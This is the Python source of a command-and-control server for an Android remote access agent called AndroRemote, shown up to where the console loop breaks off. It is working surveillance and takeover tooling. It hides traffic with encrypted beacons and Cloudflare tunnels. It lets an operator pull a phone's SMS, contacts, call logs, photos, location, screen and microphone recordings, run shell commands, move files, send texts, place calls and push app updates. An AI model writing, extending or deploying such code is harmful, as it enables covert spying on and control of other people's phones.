#!/usr/bin/env python3
"""AndroRemote C2 server.

End-to-end encrypted (AES-256-GCM) command & control over HTTP(S) beacons,
Cloudflare tunnel with persistent named-tunnel support, and a rich operator
console.

First run:
    python3 c2.py                     # auto-creates venv + PSK, starts quick tunnel
    python3 c2.py --setup-tunnel c2.example.com   # one-time: persistent named tunnel
    ./build.sh https://c2.example.com # bake URL + encryption key into the agent

Agent protocol (HTTP beacons, pipelined, payloads AES-256-GCM "ENC1:"-framed):
    GET  /b/<id>?model=...   -> 200 + one queued command, or 204 when idle
    POST /r/<id>             -> body = encrypted result; 200 + next queued cmd
    FASTPOLL <secs>          -> agent drops its poll interval to ~0.7s

Operator commands:
    sessions | use [<id>|#] | all <op...> | results | result
    rename <id> <tag> | forget <id> | history | status | clear | help | quit
    ping / id / perms / apps / notifs / loc / calllog [n] / photos [n]
    shell <cmd...> | ls [path] | startapp <pkg>
    sms <num> <text> | call <num> | log | smslog [name] | rec <secs> [out]
    get <remote> <local> | put <local> <remote> | screen [out.png]
    tap x y | swipe x1 y1 x2 y2 [ms] | settext <text> | gaction <name>
    wake | vol [n|up|down|mute] | clipset <t> | clipget | torch on|off | vibrate [ms]
    update <apk> | installstatus | fastpoll [secs]
"""
import os
import sys


def _bootstrap() -> None:
    """Ensure rich + cryptography are importable; auto-create a venv if needed."""
    import importlib.util
    missing = [m for m in ("rich", "cryptography") if importlib.util.find_spec(m) is None]
    if not missing:
        return
    if os.environ.get("ANDRO_C2_BOOTSTRAPPED"):
        print(f"missing dependencies after bootstrap: {', '.join(missing)}", file=sys.stderr)
        print("install manually:  pip install -r requirements.txt", file=sys.stderr)
        sys.exit(1)
    venv_dir = os.path.expanduser("~/.androremote/venv")
    vpy = os.path.join(venv_dir, "bin", "python")
    try:
        if not os.path.isfile(vpy):
            print(f"[*] first run: creating virtualenv at {venv_dir} ...")
            import subprocess
            subprocess.run([sys.executable, "-m", "venv", venv_dir], check=True)
            subprocess.run([vpy, "-m", "pip", "install", "--quiet", "--upgrade", "pip"],
                           check=True, stdout=subprocess.DEVNULL)
        import subprocess
        for attempt in (1, 2):
            subprocess.run([vpy, "-m", "pip", "install", "--quiet", *missing], check=True)
            chk = subprocess.run([vpy, "-c", " ".join(f"import {m}" for m in missing)])
            if chk.returncode == 0:
                break
            print(f"[*] install incomplete (attempt {attempt}) — retrying visibly ...")
            subprocess.run([vpy, "-m", "pip", "install", *missing], check=True)
            chk = subprocess.run([vpy, "-c", " ".join(f"import {m}" for m in missing)])
            if chk.returncode == 0:
                break
        else:
            raise RuntimeError("dependencies still missing after retry")
    except Exception as e:
        print(f"[!] dependency bootstrap failed: {e}", file=sys.stderr)
        print("    install manually:  pip install -r requirements.txt", file=sys.stderr)
        sys.exit(1)
    os.environ["ANDRO_C2_BOOTSTRAPPED"] = "1"
    os.execv(vpy, [vpy, os.path.abspath(__file__), *sys.argv[1:]])


_ensure_deps_ran = False
if not _ensure_deps_ran:
    _ensure_deps_ran = True
    _bootstrap()

import argparse
import base64
import hashlib
import json
import re
import shlex
import shutil
import ssl
import subprocess
import threading
import time
from collections import deque
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

import readline
from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from rich.console import Console
from rich.markup import escape
from rich.rule import Rule
from rich.table import Table
from rich.text import Text
from rich import box

PORT_DEFAULT = 8742
BEACON_TIMEOUT = 75
HOME_DIR = os.path.expanduser("~/.androremote")
KEY_FILE = os.path.join(HOME_DIR, "c2.key")
CERT_FILE = os.path.join(HOME_DIR, "c2cert.pem")
CERT_KEY_FILE = os.path.join(HOME_DIR, "c2key.pem")
TUNNEL_FILE = os.path.join(HOME_DIR, "tunnel.json")
ALIASES_FILE = os.path.join(HOME_DIR, "aliases.json")
LOG_FILE = os.path.join(HOME_DIR, "c2.log")
HISTORY_FILE = os.path.join(HOME_DIR, "history")
ENC_PREFIX = "ENC1:"

console = Console(highlight=False, soft_wrap=False)
CLIENTS = {}  # id -> {model, last_seen, pending(deque), result, seq}
LOCK = threading.Lock()
ACTIVE = {"id": None}
STARTED = time.time()
PSK = None           # 32-byte AES-256 key or None
TLS = False
TUNNEL = {"proc": None, "url": None, "mode": None, "run": False}
ALIASES = {}


# ────────────────────────────── crypto layer ──────────────────────────

def load_key(create=True):
    global PSK
    os.makedirs(HOME_DIR, exist_ok=True)
    if os.path.isfile(KEY_FILE):
        PSK = bytes.fromhex(open(KEY_FILE).read().strip())
    elif create:
        PSK = AESGCM.generate_key(bit_length=256)
        with open(KEY_FILE, "w") as f:
            f.write(PSK.hex())
        os.chmod(KEY_FILE, 0o600)
    return PSK


def key_fp():
    if not PSK:
        return "-"
    return hashlib.sha256(PSK).hexdigest()[:12]


def enc_wire(plaintext: str) -> str:
    """Frame a payload for the agent: 'ENC1:' + b64(12B nonce || AESGCM ct)."""
    if PSK is None:
        return plaintext
    nonce = os.urandom(12)
    ct = AESGCM(PSK).encrypt(nonce, plaintext.encode("utf-8"), None)
    return ENC_PREFIX + base64.b64encode(nonce + ct).decode()


def dec_wire(body: str):
    """Decrypt an agent payload. Returns plaintext str, or None on auth failure."""
    if body.startswith(ENC_PREFIX):
        if PSK is None:
            return None
        try:
            raw = base64.b64decode(body[len(ENC_PREFIX):])
            return AESGCM(PSK).decrypt(raw[:12], raw[12:], None).decode("utf-8", "replace")
        except (InvalidTag, ValueError, KeyError):
            return None
    return body  # legacy / unencrypted agent


# ────────────────────────────── TLS listener ──────────────────────────

def ensure_cert():
    """Self-signed cert for --tls (LAN/https agents pin its fingerprint)."""
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives.asymmetric import ec
    import datetime
    if os.path.isfile(CERT_FILE) and os.path.isfile(CERT_KEY_FILE):
        return CERT_FILE
    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "androremote-c2")])
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
            .add_extension(x509.SubjectAlternativeName(
                [x509.DNSName("localhost"), x509.IPAddress(__import__("ipaddress").ip_address("127.0.0.1"))]),
                critical=False)
            .sign(key, hashes.SHA256()))
    from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
    with open(CERT_FILE, "wb") as f:
        f.write(cert.public_bytes(Encoding.PEM))
    with open(CERT_KEY_FILE, "wb") as f:
        f.write(key.private_bytes(Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption()))
    os.chmod(CERT_KEY_FILE, 0o600)
    return CERT_FILE


def cert_pin():
    """SHA-256 hex of the cert DER — the value agents bake as c2_pin."""
    import hashlib
    with open(CERT_FILE, "rb") as f:
        der = ssl.PEM_cert_to_DER_cert(f.read().decode("ascii", "strict"))
    return hashlib.sha256(der).hexdigest()


# ────────────────────────────── C2 core ───────────────────────────────

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body=b""):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body:
            self.wfile.write(body)

    def _pop_pending(self, cid):
        with LOCK:
            c = CLIENTS.get(cid)
            if not c or not c["pending"]:
                return None
            return c["pending"].popleft()

    def do_GET(self):
        u = urlparse(self.path)
        m = re.match(r"^/b/([A-Za-z0-9_-]+)$", u.path)
        if not m:
            return self._send(404)
        cid = m.group(1)
        model = parse_qs(u.query).get("model", [""])[0]
        with LOCK:
            c = CLIENTS.setdefault(cid, {"model": "", "last_seen": 0, "pending": deque(), "result": None, "seq": 0})
            fresh = c["seq"] == 0 and c["last_seen"] == 0
            c["last_seen"] = time.time()
            c["model"] = model or c["model"]
            cmd = c["pending"].popleft() if c["pending"] else None
        if fresh:
            ev("+", f"new session [cyan bold]{alias_tag(cid)}[/cyan bold]"
                    + (f"  ([dim]{c['model']}[/dim])" if c["model"] else ""), "green")
        if cmd:
            self._send(200, enc_wire(cmd).encode())
        else:
            self._send(204)

    def do_POST(self):
        m = re.match(r"^/r/([A-Za-z0-9_-]+)$", urlparse(self.path).path)
        if not m:
            return self._send(404)
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n).decode("utf-8", "replace")
        cid = m.group(1)
        result = dec_wire(body)
        if result is None:
            ev("!", f"dropped result from [cyan]{alias_tag(cid)}[/cyan]: decryption failed (key mismatch?)", "yellow")
            return self._send(400)
        with LOCK:
            c = CLIENTS.setdefault(cid, {"model": "", "last_seen": 0, "pending": deque(), "result": None, "seq": 0})
            c["result"] = result
            c["enc"] = body.startswith(ENC_PREFIX)
            c["seq"] += 1
            c["last_seen"] = time.time()
        # pipelining: hand the next queued command back with the ack
        nxt = self._pop_pending(cid)
        self._send(200, enc_wire(nxt).encode()) if nxt else self._send(200)


def b64s(s):
    return base64.b64encode(s.encode()).decode()


def queue(cid, cmd):
    with LOCK:
        c = CLIENTS.setdefault(cid, {"model": "", "last_seen": 0, "pending": deque(), "result": None, "seq": 0})
        c["pending"].append(cmd)


def send_and_wait(cmd, timeout=BEACON_TIMEOUT):
    cid = ACTIVE["id"]
    if not cid:
        ev("!", "no active session — run: use", "yellow")
        return None
    with LOCK:
        c = CLIENTS.get(cid)
        if not c:
            return None
        seq = c["seq"]
    ev(">", f"dispatch to [cyan bold]{alias_tag(cid)}[/cyan bold]  [dim]{cmd[:64]}[/dim]", "magenta")
    queue(cid, cmd)
    t0 = time.time()
    while time.time() - t0 < timeout:
        with LOCK:
            c = CLIENTS.get(cid)
            if c and c["seq"] > seq and c["result"] is not None:
                return c["result"]
        time.sleep(0.3)
    ev("!", f"timeout after {timeout}s — [cyan]{alias_tag(cid)}[/cyan] may be offline", "yellow")
    return None


# ────────────────────────── tunnel management ─────────────────────────

CF_CONFIG = os.path.expanduser("~/.cloudflared/config.yml")

def tunnel_named_cfg():
    try:
        cfg = json.load(open(TUNNEL_FILE))
        return cfg if cfg.get("id") and cfg.get("hostname") else None
    except Exception:
        return None


def ensure_named_ingress(cfg, port):
    """Rewrite cloudflared config.yml so `tunnel run` routes hostname -> C2 port.
    Without ingress rules `tunnel run` connects but forwards nowhere; rewriting
    on every spawn also picks up --port changes across restarts."""
    try:
        os.makedirs(os.path.dirname(CF_CONFIG), exist_ok=True)
        with open(CF_CONFIG, "w") as f:
            f.write(f"tunnel: {cfg['id']}\n"
                    f"credentials-file: {cfg['credentials']}\n"
                    "ingress:\n"
                    f"  - hostname: {cfg['hostname']}\n"
                    f"    service: http://127.0.0.1:{port}\n"
                    "  - service: http_status:404\n")
    except Exception as e:
        ev("!", f"could not write {CF_CONFIG}: {e}", "yellow")

def _tunnel_supervisor(mode):
    """Keep cloudflared alive; restarts it (with backoff) if it dies."""
    backoff = 2
    while TUNNEL["run"]:
        cmd = None
        if mode == "named":
            cfg = tunnel_named_cfg()
            if cfg:
                ensure_named_ingress(cfg, ARGS.port)
                cmd = ["cloudflared", "tunnel", "--no-autoupdate", "--config", CF_CONFIG,
                       "run", cfg["id"]]
                TUNNEL["url"] = f"https://{cfg['hostname']}"
        elif mode == "quick":
            cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{ARGS.port}", "--no-autoupdate"]
            TUNNEL["url"] = None
        if not cmd:
            time.sleep(2)
            continue
        try:
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
            TUNNEL["proc"] = p
        except Exception as e:
            ev("!", f"cloudflared failed to start: {e}", "yellow")
            time.sleep(10)
            continue
        t0 = time.time()
        while TUNNEL["run"] and p.poll() is None:
            line = p.stderr.readline() if p.stderr else ""
            if not line:
                time.sleep(0.2)
                continue
            if mode == "quick" and TUNNEL["url"] is None:
                mm = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
                if mm:
                    TUNNEL["url"] = mm.group(0)
                    ev("*", f"quick tunnel live: [green]{TUNNEL['url']}[/green]  "
                            f"[dim](ephemeral — use --setup-tunnel for a stable URL)[/dim]", "cyan")
            elif mode == "named" and "Registered tunnel connection" in line and time.time() - t0 < 60:
                pass  # first successful connection; URL already known
        if not TUNNEL["run"]:
            break
        ev("!", "cloudflared exited — restarting in 5s", "yellow")
        time.sleep(backoff)
        backoff = min(backoff * 2, 60)


def start_tunnel_thread(mode):
    TUNNEL["mode"] = mode
    TUNNEL["run"] = mode in ("named", "quick")
    if TUNNEL["run"]:
        threading.Thread(target=_tunnel_supervisor, args=(mode,), daemon=True).start()


def cmd_setup_tunnel(hostname):
    """One-time: create a named Cloudflare tunnel with a stable hostname."""
    if not shutil.which("cloudflared"):
        ev("!", "cloudflared not found — brew install cloudflared", "yellow")
        return
    cert = os.path.expanduser("~/.cloudflared/cert.pem")
    if not os.path.isfile(cert):
        ev("*", "opening browser for `cloudflared tunnel login` (authorize your zone, then return here)", "cyan")
        subprocess.run(["cloudflared", "tunnel", "login"])
        if not os.path.isfile(cert):
            ev("!", "login not completed — aborting", "yellow")
            return
    ev("*", f"creating named tunnel [bold]androremote[/bold] → [bold]{hostname}[/bold]", "cyan")
    subprocess.run(["cloudflared", "tunnel", "create", "androremote"])
    # fetch tunnel id (create may have failed if it already exists — list handles both)
    try:
        out = subprocess.run(["cloudflared", "tunnel", "list", "--output", "json"],
                             capture_output=True, text=True, check=True).stdout
        tunnels = json.loads(out or "[]")
        match = [t for t in tunnels if t.get("name") == "androremote"]
        if not match:
            ev("!", "tunnel 'androremote' not found after create", "yellow")
            return
        tid = match[0]["id"]
    except Exception as e:
        ev("!", f"could not resolve tunnel id: {e}", "yellow")
        return
    creds = os.path.expanduser(f"~/.cloudflared/{tid}.json")
    if not os.path.isfile(creds):
        ev("!", f"credentials file missing: {creds}", "yellow")
        return
    r = subprocess.run(["cloudflared", "tunnel", "route", "dns", "-f", "androremote", hostname],
                       capture_output=True, text=True)
    if r.returncode != 0:
        ev("!", f"DNS route failed: {(r.stderr or r.stdout).strip()}", "yellow")
        return
    os.makedirs(HOME_DIR, exist_ok=True)
    cfg = {"id": tid, "name": "androremote", "hostname": hostname, "credentials": creds}
    json.dump(cfg, open(TUNNEL_FILE, "w"), indent=2)
    ensure_named_ingress(cfg, PORT_DEFAULT)
    ok(f"persistent tunnel configured — survives server restarts")
    console.print(f"  [white bold]build agent[/white bold]  [cyan]./build.sh https://{hostname}[/cyan]")
    console.print(f"  [dim]start the server normally; the tunnel URL never changes now.[/dim]")


# ─────────────────────────── session display ──────────────────────────

def load_aliases():
    global ALIASES
    try:
        ALIASES = json.load(open(ALIASES_FILE))
    except Exception:
        ALIASES = {}


def save_aliases():
    json.dump(ALIASES, open(ALIASES_FILE, "w"), indent=2)


def alias_tag(cid):
    """cid, or alias if set."""
    return ALIASES.get(cid, cid)


def resolve_tag(tag):
    """Map a typed prefix (alias, id prefix, or list number) -> real cid."""
    if tag.isdigit():
        with LOCK:
            items = sorted(CLIENTS.items(), key=lambda kv: -kv[1]["last_seen"])
        if int(tag) < len(items):
            return items[int(tag)][0]
        return None
    matches = [cid for cid in CLIENTS
               if cid.startswith(tag)
               or ALIASES.get(cid, "") == tag
               or ALIASES.get(cid, "").startswith(tag)]
    return matches[0] if len(matches) == 1 else None


def status_of(c):
    age = time.time() - c["last_seen"]
    if age <= 25:
        return ("bold green", "ONLINE", age)
    if age <= 90:
        return ("bold yellow", "IDLE  ", age)
    return ("bold red", "OFFLINE", age)


def fmt_age(secs):
    if secs < 60:
        return f"{int(secs)}s"
    if secs < 3600:
        return f"{int(secs) // 60}m{int(secs) % 60:02d}s"
    return f"{int(secs) // 3600}h{(int(secs) % 3600) // 60:02d}m"


def print_sessions():
    with LOCK:
        items = sorted(CLIENTS.items(), key=lambda kv: -kv[1]["last_seen"])
    if not items:
        ev("*", "no sessions yet — agents appear here on first beacon", "cyan")
        return
    online = sum(1 for _, c in items if time.time() - c["last_seen"] <= 25)
    console.print(Rule(f"SESSIONS · {len(items)} tracked · {online} online", style="dim"))
    t = Table(box=box.SIMPLE, pad_edge=False, show_header=True, header_style="bold white")
    t.add_column("", width=1)
    t.add_column("#", width=2, style="dim", justify="right")
    t.add_column("ID", min_width=14, no_wrap=True)
    t.add_column("MODEL", max_width=18, no_wrap=True)
    t.add_column("STATUS", width=7)
    t.add_column("SEEN", min_width=6, style="dim")
    t.add_column("PEND", width=4, justify="right")
    t.add_column("ENC", width=7, justify="center")
    t.add_column("RES", width=3, justify="center")
    for i, (cid, c) in enumerate(items):
        mark = "[bold green]●[/]" if cid == ACTIVE["id"] else " "
        st_style, st, age = status_of(c)
        t.add_row(mark, str(i), alias_tag(cid), (c["model"] or "unknown")[:24],
                  Text(st, style=st_style), fmt_age(age),
                  str(len(c["pending"])) if c["pending"] else "-",
                  "[green]AES-GCM[/green]" if c.get("enc") else "[dim]plain[/dim]",
                  "yes" if c["result"] else "[dim]-[/dim]")
    console.print(t)
    console.print(f"  [dim]● active session · use <id|alias|#> to select[/dim]\n")


def cmd_use(prefix=None):
    with LOCK:
        n = len(CLIENTS)
    if not n:
        return ev("!", "no sessions available", "yellow")
    target = None
    if prefix:
        target = resolve_tag(prefix)
        if not target:
            return ev("!", f"no unique session match: [bold]{escape(prefix)}[/bold]  (run: sessions)", "yellow")
    else:
        print_sessions()
        try:
            pick = console.input("  [bold]select session # (enter to cancel): [/bold]").strip()
        except (EOFError, KeyboardInterrupt):
            console.print()
            return
        if not pick:
            return ev("*", "cancelled", "cyan")
        target = resolve_tag(pick)
        if not target:
            return ev("!", f"no match: {pick}", "yellow")
    ACTIVE["id"] = target
    queue(target, "FASTPOLL 45")  # make follow-up control ops snappy
    with LOCK:
        model = CLIENTS[target]["model"]
    ev("●", f"active session → [cyan bold]{alias_tag(target)}[/cyan bold]"
            + (f" [dim]({model})[/dim]" if model else "")
            + "  [dim]fastpoll armed[/dim]", "green")


def cmd_broadcast(op):
    with LOCK:
        ids = list(CLIENTS.keys())
    if not ids:
        return ev("!", "no sessions", "yellow")
    for cid in ids:
        queue(cid, op)
    ev("»", f"broadcast [bold]{op}[/bold] → {len(ids)} session(s)  [dim]watch: results[/dim]", "magenta")


def cmd_results():
    with LOCK:
        items = sorted(CLIENTS.items(), key=lambda kv: -kv[1]["last_seen"])
    if not items:
        return ev("!", "no sessions", "yellow")
    console.print(Rule("LAST RESULTS", style="dim"))
    for cid, c in items:
        r = c["result"]
        if not r:
            first, style = "[dim]<none>[/dim]", ""
        else:
            first = escape(r.splitlines()[0][:90])
            style = "red" if r.startswith("ERR") else ("green" if r.startswith(("OK", "PONG")) else "")
        console.print(f"  [white]{escape(alias_tag(cid)):<20}[/white] {first}", style=style or "")
    console.print()


def cmd_status():
    with LOCK:
        n = len(CLIENTS)
    up = int(time.time() - STARTED)
    upstr = f"{up // 3600}h{(up % 3600) // 60:02d}m{up % 60:02d}s" if up >= 3600 else f"{up // 60}m{up % 60:02d}s"
    tmode = TUNNEL["mode"] or "off"
    tstate = {"off": "[dim]off[/dim]"}.get(tmode, TUNNEL["url"] or "[dim]connecting…[/dim]")
    console.print(Rule("SERVER", style="dim"))
    console.print(f"  [white bold]listener[/white bold]   http{'s' if TLS else ''}://0.0.0.0:{ARGS.port}"
                  + ("  [dim](self-signed, agents pin fingerprint)[/dim]" if TLS else ""))
    console.print(f"  [white bold]tunnel[/white bold]     {tstate}"
                  + (f"  [dim]({tmode} · supervised, auto-restart)[/dim]" if tmode != "off" else ""))
    console.print(f"  [white bold]crypto[/white bold]     "
                  + (f"[green]AES-256-GCM[/green]  [dim]key {key_fp()}… ({KEY_FILE})[/dim]"
                     if PSK else "[yellow]disabled[/yellow]  [dim](--no-enc)[/dim]"))
    console.print(f"  [white bold]uptime[/white bold]     {upstr}")
    console.print(f"  [white bold]sessions[/white bold]    {n} tracked · active: "
                  f"[cyan]{alias_tag(ACTIVE['id']) if ACTIVE['id'] else 'none'}[/cyan]")
    console.print()


# ─────────────────────────── result rendering ─────────────────────────

def show_result(text):
    for ln in text.splitlines() or [""]:
        style = "red" if ln.startswith("ERR") else ("green" if ln.startswith(("OK", "PONG")) else "")
        console.print(f"  {ln}", style=style or "", markup=False, highlight=False)


def ok(msg):
    ev("✓", msg, "green")


def err(msg):
    ev("✗", msg, "red")


def usage(msg):
    ev("!", f"usage: {msg}", "yellow")


def download_b64(r, dest):
    parts = r.split(" ", 2)
    if len(parts) == 3 and parts[0] == "OK":
        data = base64.b64decode(parts[2] + "=" * (-len(parts[2]) % 4))
        with open(dest, "wb") as f:
            f.write(data)
        ok(f"{len(data):,} bytes → [cyan]{escape(dest)}[/cyan]")
        return True
    show_result(r)
    return False


# ─────────────────────────── command dispatch ─────────────────────────

HELP_GROUPS = [
    ("session", "sessions · use [<id>|#] · result · results · all <op...> · fastpoll [s]"),
    ("manage",  "rename <id> <tag> · forget <id> · history · status · clear"),
    ("recon",   "ping · id · info · perms · apps · notifs [n] · loc · calllog [n] · photos [n] · contacts [n] · smsin [n]"),
    ("exec",    "shell <cmd...> · ls [path] · startapp <pkg> · get <r> <l> · put <l> <r>"),
    ("comms",   "sms <num> <text> · call <num> · log · smslog [name] · rec <secs> [out.wav]"),
    ("device",  "screen [out.png] · tap <x> <y> · swipe <x1 y1 x2 y2 [ms]> · settext <text>"),
    ("          ", "gaction <name> · wake · vol [n|up|down|mute] · clipset <t> · clipget"),
    ("          ", "torch on|off · vibrate [ms]"),
    ("upkeep",  "update <local.apk> · installstatus"),
    ("server",  "help · quit"),
]


def cmd_help():
    console.print(Rule("COMMAND MATRIX", style="dim"))
    for cat, cmds in HELP_GROUPS:
        console.print(f"  [magenta bold]{cat:<11}[/] {cmds}")
    console.print(f"\n  [dim]results arrive on the next beacon (≤ ~15s; ~1s once fastpoll is armed)."
                  f"\n  device ops act on the active session — run: use[/dim]\n")


def dispatch(argv):
    """Run one operator command. Returns False to exit the console."""
    op = argv[0].lower()
    rest = argv[1:]

    if op in ("quit", "exit", "q"):
        return False
    elif op == "help":
        cmd_help()
    elif op in ("sessions", "list", "clients"):
        print_sessions()
    elif op == "use":
        cmd_use(rest[0] if rest else None)
    elif op in ("all", "broadcast"):
        if not rest:
            usage("all <op...>")
        else:
            cmd_broadcast(" ".join(rest))
    elif op == "results":
        cmd_results()
    elif op == "status":
        cmd_status()
    elif op == "clear":
        console.clear()
    elif op == "history":
        for i in range(1, readline.get_current_history_length() + 1):
            console.print(f"  [dim]{i:>3}[/dim]  {escape(readline.get_history_item(i))}")
    elif op == "rename":
        if len(rest) < 2:
            usage("rename <id|current-tag> <new-tag>")
        else:
            cid = resolve_tag(rest[0])
            if not cid:
                err(f"no session: {escape(rest[0])}")
            else:
                ALIASES[cid] = rest[1]
                save_aliases()
                ok(f"[cyan bold]{escape(rest[0])}[/cyan bold] → [cyan bold]{escape(rest[1])}[/cyan bold]")
    elif op == "forget":
        if not rest:
            usage("forget <id|tag>")
        else:
            cid = resolve_tag(rest[0])
            if not cid:
                err(f"no session: {escape(rest[0])}")
            else:
                with LOCK:
                    CLIENTS.pop(cid, None)
                ALIASES.pop(cid, None)
                save_aliases()
                if ACTIVE["id"] == cid:
                    ACTIVE["id"] = None
                ok(f"forgot session [cyan]{escape(alias_tag(cid))}[/cyan] (it returns on next beacon)")
    elif op == "fastpoll":
        show_result(send_and_wait("FASTPOLL " + (rest[0] if rest else "120")) or "")
    elif op == "ping":
        show_result(send_and_wait("PING") or "")
    elif op == "id":
        show_result(send_and_wait("ID") or "")
    elif op == "info":
        show_result(send_and_wait("INFO") or "")
    elif op == "contacts":
        show_result(send_and_wait("CONTACTS " + (rest[0] if rest else "30")) or "")
    elif op == "smsin":
        show_result(send_and_wait("SMSIN " + (rest[0] if rest else "20")) or "")
    elif op == "perms":
        show_result(send_and_wait("PERMS") or "")
    elif op == "apps":
        show_result(send_and_wait("APPS") or "")
    elif op == "notifs":
        show_result(send_and_wait("NOTIFS " + (rest[0] if rest else "")) or "")
    elif op == "log":
        show_result(send_and_wait("LOG") or "")
    elif op == "smslog":
        show_result(send_and_wait("SMSLOG " + (rest[0] if rest else "")) or "")
    elif op == "ls":
        show_result(send_and_wait("LS " + (rest[0] if rest else "")) or "")
    elif op == "shell":
        if not rest:
            usage("shell <cmd...>")
        else:
            show_result(send_and_wait("SHELL " + " ".join(rest)) or "")
    elif op == "startapp":
        if not rest:
            usage("startapp <package>")
        else:
            show_result(send_and_wait("STARTAPP " + rest[0]) or "")
    elif op == "sms":
        if len(rest) < 2:
            usage("sms <number> <text>")
        else:
            show_result(send_and_wait("SMS " + rest[0] + " " + " ".join(rest[1:])) or "")
    elif op == "calllog":
        show_result(send_and_wait("CALLLOG " + (rest[0] if rest else "25")) or "")
    elif op == "call":
        if not rest:
            usage("call <number>")
        else:
            show_result(send_and_wait("CALL " + rest[0]) or "")
    elif op == "loc":
        show_result(send_and_wait("LOC") or "")
    elif op == "photos":
        show_result(send_and_wait("PHOTOS " + (rest[0] if rest else "30")) or "")
    elif op == "get":
        if len(rest) < 2:
            usage("get <remote> <local>")
        else:
            download_b64(send_and_wait("GETB64 " + b64s(rest[0])) or "", rest[1])
    elif op == "put":
        if len(rest) < 2:
            usage("put <local> <remote>")
        else:
            try:
                with open(rest[0], "rb") as f:
                    data = f.read()
            except OSError as e:
                return err(f"read {escape(rest[0])}: {e}")
            if len(data) > 32 * 1024 * 1024:
                return err("put: >32MB")
            show_result(send_and_wait("PUTB64 " + b64s(rest[1]) + " " + base64.b64encode(data).decode()) or "")
    elif op == "screen":
        dest = rest[0] if rest else "screen.png"
        download_b64(send_and_wait("SCREENB64") or "", dest)
    elif op == "rec":
        secs = rest[0] if rest else "10"
        r = send_and_wait("RECORD " + secs)
        if r is None:
            return
        show_result(r)
        parts = r.split(" ")
        if parts[0] == "OK" and len(parts) >= 4:
            path = parts[2]
            dest = rest[1] if len(rest) > 1 else os.path.basename(path)
            download_b64(send_and_wait("GETB64 " + b64s(path)) or "", dest)
    elif op == "tap":
        if len(rest) < 2:
            usage("tap <x> <y>")
        else:
            show_result(send_and_wait("TAP " + rest[0] + " " + rest[1]) or "")
    elif op == "swipe":
        if len(rest) < 4:
            usage("swipe <x1> <y1> <x2> <y2> [ms]")
        else:
            show_result(send_and_wait("SWIPE " + " ".join(rest)) or "")
    elif op == "settext":
        if not rest:
            usage("settext <text>")
        else:
            show_result(send_and_wait("SETTEXT " + " ".join(rest)) or "")
    elif op == "gaction":
        if not rest:
            usage("gaction back|home|recents|notifications|quicksettings|power|lock|screenshot")
        else:
            show_result(send_and_wait("GACTION " + rest[0]) or "")
    elif op == "wake":
        show_result(send_and_wait("WAKE") or "")
    elif op == "vol":
        show_result(send_and_wait("VOL " + (rest[0] if rest else "")) or "")
    elif op == "clipset":
        if not rest:
            usage("clipset <text>")
        else:
            show_result(send_and_wait("CLIPSET " + " ".join(rest)) or "")
    elif op == "clipget":
        show_result(send_and_wait("CLIPGET") or "")
    elif op == "torch":
        if not rest:
            usage("torch on|off")
        else:
            show_result(send_and_wait("TORCH " + rest[0]) or "")
    elif op == "vibrate":
        show_result(send_and_wait("VIBRATE " + (rest[0] if rest else "")) or "")
    elif op == "update":
        if not rest:
            usage("update <local.apk>")
        else:
            try:
                with open(rest[0], "rb") as f:
                    data = f.read()
            except OSError as e:
                return err(f"read {escape(rest[0])}: {e}")
            if len(data) > 32 * 1024 * 1024:
                return err("update: >32MB")
            remote = "/storage/emulated/0/Android/data/com.ohmpi.androremote/files/update.apk"
            show_result(send_and_wait("PUTB64 " + b64s(remote) + " " + base64.b64encode(data).decode()) or "")
            show_result(send_and_wait("INSTALL " + remote) or "")
            console.print("  [dim](device will re-beacon after the update; check: installstatus)[/dim]")
    elif op == "installstatus":
        show_result(send_and_wait("INSTALLSTATUS") or "")
    elif op == "result":
        cid = ACTIVE["id"]
        with LOCK:
            c = CLIENTS.get(cid)
        if c and c["result"]:
            console.print(Rule(f"LAST RESULT · {escape(alias_tag(cid))}", style="dim"))
            show_result(c["result"])
            console.print()
        else:
            ev("*", "no result yet", "cyan")
    else:
        err(f"unknown command: '{escape(op)}'  [dim](try: help)[/dim]")
    return True


# ─────────────────────────── event log ────────────────────────────────

MARKUP_RE = re.compile(r"\[/?(?:[a-z ]+)\]")


def ev(sym, msg, style=""):
    """Timestamped operator event: console + rotating plain-text log."""
    console.print(f"  [dim]\\[{datetime.now().strftime('%H:%M:%S')}][/dim] "
                  + (f"[{style}]{sym}[/]" if style else sym) + f" {msg}")
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now().isoformat(timespec='seconds')} {sym} {MARKUP_RE.sub('', msg)}\n")
    except Exception:
        pass


def repl():
    ev("*", f"console ready — type [bold]help[/bold] for the command matrix, "
            f"[bold]sessions[/bold] to list agents", "cyan")
    console.print()
    try:
        readline.read_history_file(HISTORY_FILE)
    except Exception:
        pass
    while True:
        active = ACTIVE["id"]
        if active:
            prompt = "[magenta bold]c2[/][dim]:[/][cyan bold]" + escape(alias_tag(active)) + "[/] [bold]❯[/] "
        else:
            prompt = "[magenta bold]c2[/] [dim]❯[/] "
        try:
            line = console.input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            console.print()
            break
        if not line:
            continue
        try:
            argv = shlex.split(line)
        except ValueError as e:
            err(f"parse: {escape(str(e))}")
            continue
        try:
            if not dispatch(argv):
                break
        except KeyboardInterrupt:
            console.print("  [yellow]^C interrupted — command may still be queued[/yellow]")
        except Exception as e:
